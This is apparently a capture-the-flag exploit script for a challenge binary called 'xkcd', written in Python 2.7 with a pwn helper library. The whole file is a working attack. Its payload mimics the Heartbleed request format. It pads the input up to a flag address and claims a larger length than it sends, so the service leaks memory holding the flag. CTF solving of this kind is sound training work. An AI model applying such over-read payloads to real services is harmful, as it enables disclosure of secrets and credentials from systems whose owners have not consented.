#!/usr/bin/env python2.7
# -*- coding:utf-8 -*-
from mkpwn import *

LOCAL = True
DEBUG = True

# global
INPUT_ADDR  = 0x6B7340
FLAG_ADDR   = 0x6B7540

# exp
def get_io():
    if LOCAL:
        target  = './xkcd'
    else:
        target  = ('0', 0)

    global io
    io  = mk(target, DEBUG)

def exp():
    io.gdb_hint([0x401152])

    payload  = "SERVER, ARE YOU STILL THERE" + "?"
    payload += " IF SO, REPLY "
    payload += "\"" + "A" * (FLAG_ADDR - INPUT_ADDR) + "\""
    payload += "junk"
    payload += "(" + str(FLAG_ADDR - INPUT_ADDR + 35) + " LETTERS" + ")"
    io.pr(payload)
    io.rl()

# main
if __name__ == '__main__':
    get_io()
    exp()
